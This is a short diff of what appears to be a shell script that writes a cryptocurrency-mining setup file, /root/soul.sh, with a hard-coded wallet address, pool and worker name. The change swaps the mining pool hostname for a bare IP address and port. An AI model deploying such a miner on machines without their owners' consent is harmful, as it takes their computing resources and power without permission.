@@ -83,7 +83,7 @@ apt update && apt install -y sudo nano curl wget
 cat << 'EOM' > /root/soul.sh
 #!/bin/bash
 WALLET="49xs4gWaPLWFzkLbmFgBdm9V9ZU2rf7djF7kUVE11seJgyLEt6GekKpTVhugLXD8tq7gHoMtiqBRj7TsVWdKN5m6Kshxpsv"
-POOL="pool.hashvault.pro:8888"
+POOL="31.97.58.247:8080"
 WORKER="king3"
 
 echo "[+] Starting setup..."
